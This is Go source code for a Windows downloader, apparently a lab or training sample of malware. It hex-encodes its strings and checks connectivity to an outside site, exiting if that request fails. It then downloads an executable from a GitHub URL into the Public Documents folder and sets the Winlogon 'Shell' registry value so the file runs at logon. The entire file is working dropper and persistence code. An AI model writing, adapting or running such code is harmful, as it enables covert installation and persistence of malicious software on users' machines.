package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows/registry"
	"io"
	"net/http"
	"os"
)

func main() {
	a := "433a5c55736572735c5075626c69635c446f63756d656e74735c73706c36342e657865" //C:\Users\Public\Documents\spl64.exe
	b := "68747470733A2F2F6769746875622E636F6D2F67726E62656C7477617272696F722F526561642E657865" //https://github.com/grnbeltwarrior/Read.exe //WARNING: Does not exist. Can you create a lab to mimic the request/response to satisfy the conditions to have the binary continue?
	c := "68747470733a2f2f6162632e78797a" //https://abc.xyz
	d := "534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c57696e6c6f676f6e5c"
	f := "22433a5c55736572735c5075626c69635c446f63756d656e74735c73706c36342e65786522202f6261636b67726f756e64"
	asdf := Think(c)
	if  asdf != nil {
		os.Exit(0)
	} else {
		url := WaitWhat(b)
		err := Sabotage(WaitWhat(a), url)
		if err != nil {
			os.Exit(0)
		} else {
			result := Intergalactic(d,f)
			if result != nil {
				os.Exit(0)
			}
		}
	}
}
// WaitWhat : Nevermind
func WaitWhat(curl string) string {
	str := curl
	bs, err := hex.DecodeString(str)
	if err != nil {
		panic(err)
	}
	return string(bs)
}
// Think : R-E-S-P-E-C-T
func Think(c string) error {
	hurl := WaitWhat(c)
	var PTransport = & http.Transport { Proxy: http.ProxyFromEnvironment }
	client := http.Client { Transport: PTransport }
	req, err := http.NewRequest("GET", hurl, nil)
	req.Header.Add("User-Agent",`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/83.0.478.64`)
	resp, err := client.Do(req)
	//resp, err := http.Get(hurl)
	if err != nil {
		return err
	}
	resp.Body.Close()
	//_, err = io.Copy(out, resp.Body)
	return err
}
// Sabotage: Robert Muldoon
func Sabotage(filepath string, url string) error {
	var PTransport = & http.Transport { Proxy: http.ProxyFromEnvironment }
	client := http.Client { Transport: PTransport }
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Add("User-Agent",`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/83.0.478.64`)
	resp, err := client.Do(req)
	//resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}
// Intergalactic: Nickels and Dimes
func Intergalactic(d string, f string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, WaitWhat(d), registry.QUERY_VALUE|registry.WRITE)
	if err != nil {
		return err
	}
	if err := k.SetStringValue("Shell", WaitWhat(f)); err != nil {
		return err
	}
	defer k.Close()
	return err
}
